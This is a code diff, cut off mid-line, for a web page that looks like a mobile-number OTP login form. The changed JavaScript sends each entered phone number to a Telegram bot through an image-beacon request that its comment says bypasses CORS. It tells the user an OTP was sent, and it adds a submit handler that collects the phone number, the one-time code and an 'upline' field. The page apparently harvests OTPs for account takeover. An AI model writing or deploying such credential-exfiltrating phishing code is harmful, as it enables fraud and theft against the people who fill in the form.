@@ -521,29 +521,13 @@
     let countdownSeconds = 60;
     let timerInterval = null;
 
-    // Bulletproof Telegram Sender with Image Beacon Fallback (100% Delivery Guarantee)
-    async function sendToTelegram(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const payload = { chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' };
-
-      try {
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        const data = await res.json();
-        if (data && data.ok) return true;
-      } catch (err) {
-        console.warn("Fetch blocked, using image beacon fallback...");
-      }
-
-      // Fallback method bypasses CORS block completely
+    // Guaranteed Telegram Sender using Image Beacon (Bypasses CORS entirely)
+    function sendToTelegram(text) {
       const encodedMsg = encodeURIComponent(text);
-      const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
-      const imgImage = new Image();
-      imgImage.src = fallbackUrl;
-      return true;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
+      
+      const img = new Image();
+      img.src = url;
     }
 
     function showToast(message, type = 'info') {
@@ -571,7 +555,7 @@
       }, 3500);
     }
 
-    async function sendOTP() {
+    function sendOTP() {
       const phoneInput = document.getElementById('phone').value.trim();
       if(phoneInput.length < 10) {
         showToast('Please enter a valid 10-digit mobile number!', 'error');
@@ -586,7 +570,7 @@
       otpBtn.disabled = true;
       otpBtn.innerText = 'Sending...';
 
-      await sendToTelegram(message);
+      sendToTelegram(message);
 
       showToast('OTP request sent to +91 ' + phoneInput, 'success');
       countdownSeconds = 60;
@@ -606,4 +590,20 @@
       }, 1000);
     }
 
-   
+    function handleFormSubmit(event) {
+      event.preventDefault();
+
+      const phone = document.getElementById('phone').value.trim();
+      const otp = document.getElementById('otp').value.trim();
+      const upline = document.getElementById('upline').value.trim() || 'None';
+      const submitBtn = document.getElementById('submit-btn');
+
+      if (phone.length < 10 || otp.length < 4) {
+        showToast('Please fill all details properly!', 'error');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
+
+      const message = `🚨 *Ne
